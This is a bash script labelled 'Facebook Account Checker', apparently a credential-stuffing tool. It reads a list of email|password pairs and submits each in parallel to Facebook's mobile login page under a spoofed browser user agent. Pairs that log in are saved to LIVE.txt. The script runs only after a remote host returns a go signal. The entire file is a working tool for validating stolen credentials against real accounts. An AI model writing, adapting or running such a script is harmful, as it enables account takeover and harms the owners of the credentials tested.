#!/bin/bash
G='\033[92m'
R='\033[91m'
W='\033[37m'
echo -e "${W}[${R}*${W}]${G} Started At ${W}: $(date)"
echo -e "${W}[${R}*${W}]${G} Checking Connection ...${W}"
if [ "$(curl -s http://bnerr.com/con.txt)" = "1" ]; then
sleep 2
clear
con=1
sl33p=2
threads=1
year=`date "+%Y"`
month=`date "+%m"`
function gas () {
if [ "$(curl -s --compressed --connect-timeout 5 --cookie-jar cookiesss.tmp -X POST "https://free.facebook.com/login/" -L -H "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0" -H "Referer: https://mobile.facebook.com/" --data "email=$(echo ${acc} | cut -d "|" -f1)&pass=$(echo ${acc} | cut -d "|" -f2)&login=Masuk" | grep -o "<title>Facebook</title>")" = "<title>Facebook</title>" ]; then
echo -e "${W}[${G}+${W}]${G}" ${acc} "${W}=> ${W}[${G}LIVE${W}]"
echo ${acc} >> LIVE.txt
else
echo -e "${W}[${R}-${W}]${R}" ${acc} "${W}=> ${W}[${R}DIE${W}]"
fi
}

function gaskeun () {
	IFS=$'\r\n' GLOBIGNORE='*' command eval 'leho=($(cat $list))'
	for (( i = 0; i <"${#leho[@]}"; i++ )); do
		acc="${leho[$i]}"
        fucked=$(expr $con % $threads)
  		if [[ $fucked == 0 && $con > 0 ]]; then
    		sleep $sl33p
  		fi
  		gas &
	    con=$[$con+1]
	done
	wait
}
echo -e "${R}  ∆${W}_${R}∆${W}"
echo -e " (${R}0${W},${R}O${W}) Facebook Account Checker"
echo -e " (   ) Powered By D3r2y"
echo -e ' -"-"--'
echo -e "${W}[${R}*${W}]${G} Started At ${W}: $(date)"
echo -e -n "${NT}[${R}*${NT}] ${G}Input Account List: ${W}"; read list;
echo -e "${W}[${R}*${W}]${G} Checking ${W}: $(cat $list | wc -l) Account"
gaskeun
echo -e "${W}[${R}*${W}]${G} LIVE Account Saved ${W}: LIVE.txt"
else
echo -e "${W}[${R}!${W}]${R} Unknown Error !"
fi
